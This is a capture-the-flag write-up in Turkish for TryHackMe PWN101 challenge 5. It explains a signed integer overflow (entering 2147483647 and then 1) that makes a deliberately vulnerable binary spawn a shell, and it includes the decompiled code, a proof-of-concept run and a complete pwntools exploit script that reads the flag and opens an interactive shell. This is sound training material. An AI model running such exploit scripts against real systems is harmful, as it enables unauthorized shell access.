# TryHackMe PWN101

## Challenge 5

### Dosya

Dosyayı açtığımızda bizden 2 sayı istemektedir ve bu sayıların toplamlarını bize vermektedir.

Ancak dosyaya negatif sayı verdiğimizde bize uyarı verip programı sonlandırmaktadır.

Programı decompile ettiğimizde ise sayıların toplamının negatif olması durumunda shell alacağımızı görebiliyoruz.

```c
puts("-------=[ BAD INTEGERS ]=-------");
puts("|-< Enter two numbers to add >-|\n");
printf("]>> ");
__isoc99_scanf(data.0000216f, &var_1ch);
printf("]>> ");
__isoc99_scanf(data.0000216f, (int64_t)&var_1ch + 4);
var_14h = var_1ch._4_4_ + (int32_t)var_1ch;
if (((int32_t)var_1ch < 0) || (var_1ch._4_4_ < 0)) {
    printf("\n[o.O] Hmmm... that was a Good try!\n", (int32_t)var_1ch, var_1ch._4_4_, var_14h);
else if (var_14h < 0) {
    printf("\n[*] C: %d", var_14h);
    puts("\n[*] Popped Shell\n[*] Switching to interactive mode");
    system("/bin/sh");
}
```

### Exploit

Herhangi bir şekilde negatif sayı giremesekte, eğer integer overflow yaparsak sayılar negatif olacaktır.

Bunun için önce  2^31 - 1 sayısını gireceğiz, daha sonra pozitif herhangi bir sayı girdiğimizde integer overflow olmuş olacak ve sayıların toplamı negatif olacaktır.

### POC

```bash
$ ./exploit.py remote 10.10.37.118 9005
[+] Opening connection to 10.10.37.118 on port 9005: Done
[*] Sending Payload.
[*] Getting Flag
[+] Flag achieved!: THM{[REDACTED]}
[+] Getting Shell.
[*] Switching to interactive mode
$ id
uid=1006(pwn105) gid=1006(pwn105) groups=1006(pwn105)
```

### Python Script

```python
#!/bin/env python3

from pwn import *
import argparse

parser = argparse.ArgumentParser(description='TryHackMe PWN101 Challange 5 Exploit')

subparsers = parser.add_subparsers(dest='mode', help='Select mode: remote or local')

remote_parser = subparsers.add_parser('remote', help='Remote mode: Provide IP address and port')
remote_parser.add_argument('ip', help='IP address')
remote_parser.add_argument('port', help='Port number')

local_parser = subparsers.add_parser('local', help='Local mode: Provide file path')
local_parser.add_argument('file', help='File path')

args = parser.parse_args()

mode = args.mode

if mode == 'remote':
    ip = args.ip
    port = args.port

    p = remote(ip, port)

elif mode == 'local':
    file = args.file

    context.binary = binary = ELF(file)
    p = process()
    
else:
    parser.error('Please select remote or local mode.')
    

p.recv()

log.info("Sending Payload.")
p.sendline(b"2147483647")
p.recv()
p.sendline(b"1")
p.recvuntil(b"interactive mode\n")

log.info("Getting Flag")
p.sendline(b"cat flag.txt")
flag = p.recv().decode()

log.success("Flag achieved!: " + flag)

log.success("Getting Shell.")
p.interactive()
```
